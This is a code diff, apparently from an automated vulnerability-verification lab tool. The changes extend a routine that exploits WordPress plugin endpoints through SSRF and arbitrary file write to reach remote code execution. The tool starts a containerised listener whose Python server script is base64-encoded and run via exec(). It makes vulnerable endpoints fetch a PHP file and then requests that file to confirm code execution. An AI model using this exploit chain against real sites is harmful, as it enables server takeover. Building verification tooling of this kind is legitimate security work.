@@ -1000,13 +1000,15 @@ class _Lab:
         una URL y guarda el contenido (arbitrary file write via URL fetch).
         Tambien vuelca la URL solicitada a /var/log/ssrf.log para verificacion SSRF."""
         self.listener = f"binoracle-wpverify-{self.tag}-ssrf"
-        body_b64 = __import__("base64").b64encode(serve_body).decode()
+        import base64 as _b64
+        body_b64 = _b64.b64encode(serve_body).decode()
         ct_safe = content_type.replace("'", "").replace('"', "")
-        # Python one-liner HTTP server: logs path, responds with decoded body
-        srv = (
-            "import base64,http.server,socketserver;"
-            f"BODY=base64.b64decode('{body_b64}');"
-            f"CT='{ct_safe}';"
+        # Encode the full Python server script as base64 to avoid all shell-quoting
+        # and newline-in-string issues when passed through Docker → sh → python3.
+        _srv_src = (
+            "import base64,http.server,socketserver\n"
+            f"BODY=base64.b64decode('{body_b64}')\n"
+            f"CT='{ct_safe}'\n"
             "class H(http.server.BaseHTTPRequestHandler):\n"
             " def do_GET(self):\n"
             "  open('/var/log/ssrf.log','ab').write(('REQ '+self.path+'\\n').encode())\n"
@@ -1017,9 +1019,10 @@ class _Lab:
             "  self.wfile.write(BODY)\n"
             " def log_message(self,*a):pass\n"
             "socketserver.TCPServer.allow_reuse_address=True\n"
-            "socketserver.TCPServer(('',8080),H).serve_forever()"
+            "socketserver.TCPServer(('',8080),H).serve_forever()\n"
         )
-        cmd = f"python3 -c \"{srv}\""
+        srv_b64 = _b64.b64encode(_srv_src.encode()).decode()
+        cmd = f"python3 -c \"import base64;exec(base64.b64decode('{srv_b64}').decode())\""
         r = self.sh("run", "-d", "--name", self.listener, "--network", self.net, _ALPINE_IMAGE,
                     "sh", "-c", f"apk add -q python3 2>/dev/null; {cmd}",
                     timeout=timeout)
@@ -7061,7 +7064,7 @@ def verify_wordpress_ssrf(
 _DEST_PATH_HINTS = (
     "missed", "dest", "destination", "save_path", "save_to", "file_path",
     "file_dest", "out", "output", "target", "local_path", "path", "filepath",
-    "filename", "dst",
+    "filename", "file_name", "dst",
 )
 
 
@@ -7122,26 +7125,33 @@ def verify_wordpress_fetch_and_write_rce(
         req_params = dict(_params_dict)
         req_params[url_p] = f"http://{lab.listener}:8080/{marker}.php"
         if dest_p:
-            req_params[dest_p] = dest_path
+            # Some plugins expect just the filename (e.g. file_name=marker.php),
+            # others a full server path.  Detect name-only hints and use basename.
+            _name_only_hints = ("filename", "file_name", "fname", "name")
+            if any(dest_p.lower() == h for h in _name_only_hints):
+                req_params[dest_p] = f"{marker}.php"
+            else:
+                req_params[dest_p] = dest_path
         elif "missed" in req_params:
             req_params["missed"] = dest_path
 
         step(f"enviando peticion {m} al endpoint ({url_p}=http_srv, dest={dest_path})...")
+        import requests as _req
         try:
             endpoint_full = f"{base}{endpoint or '/wp-admin/admin-ajax.php'}"
             if m == "GET":
-                r = requests.get(endpoint_full, params=req_params, timeout=25, verify=False)
+                r = _req.get(endpoint_full, params=req_params, timeout=25, verify=False)
             else:
-                r = requests.post(endpoint_full, data=req_params, timeout=25, verify=False)
+                r = _req.post(endpoint_full, data=req_params, timeout=25, verify=False)
             step(f"respuesta del endpoint: HTTP {r.status_code}, {len(r.text)} bytes")
-        except requests.RequestException as exc:
+        except _req.RequestException as exc:
             res.detail = f"error de red enviando peticion: {exc}"
             return res
 
         # Verify: GET the written PHP file
         time.sleep(1)
         try:
-            r2 = requests.get(f"{base}/wp-content/uploads/{marker}.php", timeout=15, verify=False)
+            r2 = _req.get(f"{base}/wp-content/uploads/{marker}.php", timeout=15, verify=False)
             if marker in r2.text:
                 res.verified = True
                 res.detail = (f"SSRF→file write→RCE confirmado: el servidor descargo el codigo PHP "
